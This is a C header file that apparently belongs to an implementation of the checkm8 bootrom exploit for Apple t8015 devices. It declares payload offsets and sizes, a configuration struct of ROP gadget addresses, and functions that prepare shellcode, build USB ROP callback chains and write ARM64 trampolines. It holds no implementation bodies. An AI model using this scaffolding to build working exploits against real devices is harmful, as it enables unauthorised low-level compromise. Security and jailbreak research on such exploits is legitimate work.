#include <stdint.h>
#include "vector.h"

#ifndef PAYLOAD_OFFSET_ARMV7
#define PAYLOAD_OFFSET_ARMV7    384
#define PAYLOAD_SIZE_ARMV7      320
#define PAYLOAD_OFFSET_ARM64    384
#define PAYLOAD_SIZE_ARM64      576
#endif

typedef struct usb_callback {
    uint64_t func_address;
    uint64_t cb_address;
} usb_cb;

typedef struct vector_callbacks {
    usb_cb* data;
    int size;
    int capacity;
} vcb;

typedef struct payload_config {
    // uint64_t constants_usb[6];
    // uint64_t constants_checkm8[8];
    v64 constants_usb;
    v64 constants_checkm8;

    uint64_t load_write_gadget;
    uint64_t write_sctlr_gadget;
    uint64_t func_gadget;
    uint64_t write_ttbr0;
    uint64_t tlbi;
    uint64_t dc_civac;
    uint64_t dmb;
    uint64_t handle_interface_request;

    vcb callbacks; // [13]
} payload_config;

vcb vcb_new(int capacity);
void vcb_init(vcb* v, int size);
void vcb_push(vcb* v, usb_cb element);
usb_cb vcb_value(vcb* v, int index);
usb_cb create_usb_callback(uint64_t func, uint64_t cb);
void populate_t8015_usb_consts(v64* constants);
void populate_t8015_checkm8_consts(v64* constants);
payload_config get_t8015_payload();
payload_config get_config(int cpid);
v8 prepare_shellcode(char* filename, v64* constants);
v8 usb_rop_callbacks(uint64_t address, uint64_t func_gadget, vcb callbacks);
v8 asm_arm64_x7_trampoline(uint64_t dest);
uint32_t asm_arm64_branch(uint64_t src, uint64_t dest);
v8 create_overwrite(uint64_t nop_gadget, uint64_t addr1, uint64_t addr2, uint32_t end);